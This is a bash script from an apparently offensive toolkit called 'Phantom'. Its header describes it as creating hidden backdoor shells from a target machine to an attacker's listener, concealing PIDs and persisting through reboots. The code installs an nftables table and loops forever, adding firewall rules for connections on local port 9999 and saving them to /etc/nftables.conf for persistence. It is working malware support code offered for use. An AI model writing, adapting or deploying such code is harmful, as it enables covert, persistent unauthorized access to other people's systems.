#!/bin/bash

: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and hides their pid, persisting through reboots.
It also hides the files needed to perform the above.

Copyright Â© 2018 Konstantinos Sarantopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

#change the ip and port in the connection_ip and connection_port according to the ip of the listening ncat port

nft flush table PHANTOM
nft add table ip PHANTOM
nft add chain PHANTOM INPUT { type filter hook input priority -- -333 \; }
nft list ruleset >/etc/nftables.conf

while true; do

connection_ip=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /127.0.0.1:9999/) print }' |  awk '{ if($6 ~ /ESTABLISHED/) print }' |\
awk '{ print $5 }' | awk -F: '{ print $1 }')
read -d z -a ip <<< "$connection_ip"
connection_port=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /127.0.0.1:9999/) print }' |  awk '{ if($6 ~ /ESTABLISHED/) print }' |\
awk '{ print $5 }' | awk -F: '{ print $2 }')
read -d z -a port <<< "$connection_port"
if [ "${ip[0]}" != "" ]; then
	for (( i=0; i < ${#ip[@]}; i=i+1 )); do
		count=0	
		while read nft; do
			if [ "$nft" == "ip saddr ${ip[i]} drop" ]; then
				echo "rule ${ip[i]} drop already exists"
				count=1
			fi
		done < /etc/nftables.conf
		if [ "$count" != "1" ]; then				
			echo "allowing ${ip[i]}:${port[i]}"
			nft add rule ip PHANTOM INPUT ip saddr ${ip[i]} tcp sport ${port[i]} accept
			nft add rule ip PHANTOM INPUT ip saddr ${ip[i]} drop
			nft list ruleset > /etc/nftables.conf
		fi	
	done
fi
sleep 20

done
